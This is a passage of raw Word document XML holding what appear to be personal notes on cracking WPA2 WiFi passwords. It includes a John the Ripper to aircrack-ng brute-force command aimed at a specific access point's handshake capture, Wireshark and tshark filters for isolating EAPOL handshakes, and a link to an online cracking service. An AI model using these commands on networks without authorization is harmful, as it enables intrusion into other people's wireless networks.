          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:~#</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>john --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>stdout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>incremental:all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:19:5B:52:AD:F7 -w - /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2578B0B9" w14:textId="77777777" w:rsidR="008919ED" w:rsidRPr="008919ED" w:rsidRDefault="008919ED" w:rsidP="008919ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F70AD28" w14:textId="7F9367A5" w:rsidR="00C14F90" w:rsidRPr="00B253E8" w:rsidRDefault="00C14F90" w:rsidP="00B253E8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">Wireshark and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Tshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="30AFC8C0" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004F4FAB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Wireshark filter for handshakes </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B532D5" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="00AA52EE" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>EAPOL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6C0159" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="004F4FAB" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Display filter for mac address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6787D162" w14:textId="2DB05C0C" w:rsidR="00C14F90" w:rsidRPr="000F33A6" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 -R "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>eth.addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>eq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>xx:xx:xx:xx:xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59576EE5" w14:textId="42FCA713" w:rsidR="00E71FE9" w:rsidRPr="00812CFB" w:rsidRDefault="00E71FE9" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E71FE9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>How to Strip your Handshake with Wireshark:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A463DBB" w14:textId="77777777" w:rsidR="00E71FE9" w:rsidRPr="008D1A6B" w:rsidRDefault="00E71FE9" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Open your Capture in Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7359DCA6" w14:textId="77777777" w:rsidR="008D1A6B" w:rsidRDefault="008D1A6B" w:rsidP="00812CFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43BAF00C" w14:textId="71A260D0" w:rsidR="00E71FE9" w:rsidRPr="008D1A6B" w:rsidRDefault="00E71FE9" w:rsidP="00812CFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Enter "</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">eapol || </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.fc.type_subtype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> == 0x04 || </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.fc.type_subtype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> == 0x08</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>" as filter expression (without quotes) then press "Apply"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D68EE64" w14:textId="77777777" w:rsidR="00812CFB" w:rsidRPr="008D1A6B" w:rsidRDefault="00812CFB" w:rsidP="00812CFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5938585B" w14:textId="7597D047" w:rsidR="00E71FE9" w:rsidRPr="008D1A6B" w:rsidRDefault="00E71FE9" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t> Go to File -&gt; Save As</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1A6B">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>. Menu, Enter new File name and select "Displayed" to save filtered packets only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1E1E6A" w14:textId="77777777" w:rsidR="00E71FE9" w:rsidRDefault="00E71FE9" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E6610B5" w14:textId="0CCE7DB5" w:rsidR="008D1A6B" w:rsidRDefault="008D1A6B" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Online handshake crack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9BB729" w14:textId="41614D85" w:rsidR="008D1A6B" w:rsidRPr="008D1A6B" w:rsidRDefault="006D3FA1" w:rsidP="008D1A6B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r w:rsidR="008D1A6B" w:rsidRPr="00BB71AD">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:eastAsia="ja-JP"/>
          </w:rPr>
          <w:t>https://www.cloudcracker.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3CACEBBD" w14:textId="77777777" w:rsidR="008D1A6B" w:rsidRDefault="008D1A6B" w:rsidP="00E71FE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AC51028" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Display Filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7509BCE6" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>A complete list of 802.11 display filter fields can be found in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="032F99"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:eastAsia="ja-JP"/>
          </w:rPr>
          <w:t>wlan</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId9" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="032F99"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:eastAsia="ja-JP"/>
          </w:rPr>
          <w:t>wlan_mgt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>, and </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="032F99"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:eastAsia="ja-JP"/>
          </w:rPr>
          <w:t>wlan_aggregate</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r>
        <w:rPr>
